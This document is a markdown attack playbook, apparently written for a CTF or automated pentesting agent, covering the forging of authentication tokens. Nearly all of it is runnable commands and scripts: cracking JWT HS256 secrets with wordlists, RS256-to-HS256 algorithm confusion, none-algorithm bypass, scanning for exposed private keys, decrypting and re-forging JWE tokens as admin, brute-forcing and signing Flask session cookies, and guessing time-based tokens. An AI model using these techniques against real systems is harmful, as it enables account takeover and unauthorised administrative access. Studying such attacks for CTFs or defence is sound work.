# Token Attack Trees

## JWT (2 dots: header.payload.signature)

### Step 1: Scan all common attacks
```bash
TOKEN="eyJ..."
python3 ~/tools/jwt_tool/jwt_tool.py $TOKEN -M at 2>/dev/null | head -40
```

### If `alg: HS256` → try weak secret
```bash
# jwt_tool built-in wordlist
python3 ~/tools/jwt_tool/jwt_tool.py $TOKEN -C -d ~/tools/jwt_tool/wordlists/common_pass.txt 2>/dev/null

# SecLists
python3 ~/tools/jwt_tool/jwt_tool.py $TOKEN -C \
  -d /home/foqs/SecLists/Passwords/Common-Credentials/10k-most-common.txt 2>/dev/null

# If secret found → forge admin token
python3 ~/tools/jwt_tool/jwt_tool.py $TOKEN -T -S hs256 -p "FOUND_SECRET" 2>/dev/null
```

### If `alg: RS256` → try algorithm confusion (RS256→HS256 with public key)
```bash
# Get public key first (from /resources/key.pem or JWKS endpoint)
curl -s TARGET/.well-known/jwks.json
curl -s TARGET/resources/key.pem -o /tmp/aurelinth/pub.pem

# Algorithm confusion attack
python3 ~/tools/jwt_tool/jwt_tool.py $TOKEN -X k -pk /tmp/aurelinth/pub.pem 2>/dev/null
```

### Always try → none algorithm
```bash
python3 ~/tools/jwt_tool/jwt_tool.py $TOKEN -X a 2>/dev/null
```

---

## JWE (4 dots: header.key.iv.ciphertext.tag)

### Step 1: Decode JWE header to identify algorithm
```bash
TOKEN="eyJ..."
echo $TOKEN | cut -d'.' -f1 | python3 -c "
import sys, base64, json
h = sys.stdin.read().strip()
h += '=' * (4 - len(h) % 4)
d = json.loads(base64.urlsafe_b64decode(h))
print('alg:', d.get('alg'))
print('enc:', d.get('enc'))
print('cty:', d.get('cty'))  # if JWT → nested JWT inside JWE
"
# Common CTF JWE algs: RSA-OAEP, RSA-OAEP-256, A256GCM
```

### If public key exposed → check for private key
```bash
# Common private key locations
for path in \
    /resources/private.pem /resources/private_key.pem \
    /resources/key_private.pem /resources/server.key \
    /private/key.pem /.well-known/private.pem \
    /backup/key.pem /dev/key.pem /key.pem; do
    code=$(curl -s -o /dev/null -w "%{http_code}" TARGET$path)
    echo "$code $path"
done
```

### If private key found → decrypt JWE and re-forge as admin
```python
# python3 /tmp/aurelinth/forge_jwe.py
from jwcrypto import jwt, jwk
import json

with open("/tmp/aurelinth/private.pem", "rb") as f:
    private_key = jwk.JWK.from_pem(f.read())

token = "EXISTING_JWE_TOKEN"
tok = jwt.JWT(key=private_key, jwt=token)
claims = json.loads(tok.claims)
print("Decrypted claims:", claims)

claims["sub"] = "admin"
claims["role"] = "admin"

with open("/tmp/aurelinth/pub.pem", "rb") as f:
    public_key = jwk.JWK.from_pem(f.read())

new_tok = jwt.JWT(
    header={"alg": "RSA-OAEP-256", "enc": "A256GCM"},
    claims=claims
)
new_tok.make_encrypted_token(public_key)
print("Forged JWE:", new_tok.serialize())
```

### If `cty: JWT` (nested JWT inside JWE) → extract inner JWT and attack it
```python
# Decrypt JWE to get inner JWT, then attack the inner JWT with jwt_tool
from jwcrypto import jwt, jwk
with open("/tmp/aurelinth/private.pem", "rb") as f:
    key = jwk.JWK.from_pem(f.read())
tok = jwt.JWT(key=key, jwt="JWE_TOKEN")
print("Inner JWT:", tok.claims)  # attack this with jwt_tool
```

### If no private key → check algorithm weaknesses
```
RSA1_5 (PKCS1v1.5) → potentially vulnerable to Bleichenbacher
A128CBC-HS256 enc → potentially vulnerable to padding oracle in some implementations
```
If no exploitable weakness found → report and stop (not exploitable blackbox without private key).

---

## Flask Session Cookie

### Detect and brute force
```bash
COOKIE="eyJ..."

# Detect if Flask session
echo $COOKIE | python3 -c "
import sys, base64
c = sys.stdin.read().strip()
if c.startswith('eyJ'):
    decoded = base64.urlsafe_b64decode(c.split('.')[0] + '==')
    print(decoded[:50])
"

# Brute force secret
flask-unsign --unsign --cookie "$COOKIE" \
  --wordlist /home/foqs/SecLists/Passwords/Common-Credentials/10k-most-common.txt \
  --no-literal-eval 2>/dev/null

# If secret found → forge
flask-unsign --sign \
  --cookie "{'user_id': 1, 'role': 'admin'}" \
  --secret 'FOUND_SECRET'
```

---

## Custom Token Patterns

### Time-based predictable tokens
```python
# python3 /tmp/aurelinth/test_predictable.py
import hashlib, time, requests

TARGET = "http://TARGET"

for delta in range(-60, 60):
    t = int(time.time()) + delta
    for candidate in [str(t), hashlib.md5(str(t).encode()).hexdigest()]:
        r = requests.get(f"{TARGET}/profile", cookies={"token": candidate})
        if r.status_code == 200 and "Forbidden" not in r.text:
            print(f"[HIT] token={candidate}")
```

### Inspect token structure
```bash
TOKEN="..."
# Count dots: JWT=2, JWE=4, Flask=2 with compressed header
echo $TOKEN | tr '.' '\n' | wc -l

# Decode base64 sections
echo $TOKEN | cut -d'.' -f1 | python3 -c "
import sys, base64, json
h = sys.stdin.read().strip()
h += '=' * (4 - len(h) % 4)
print(json.dumps(json.loads(base64.urlsafe_b64decode(h)), indent=2))
"
```
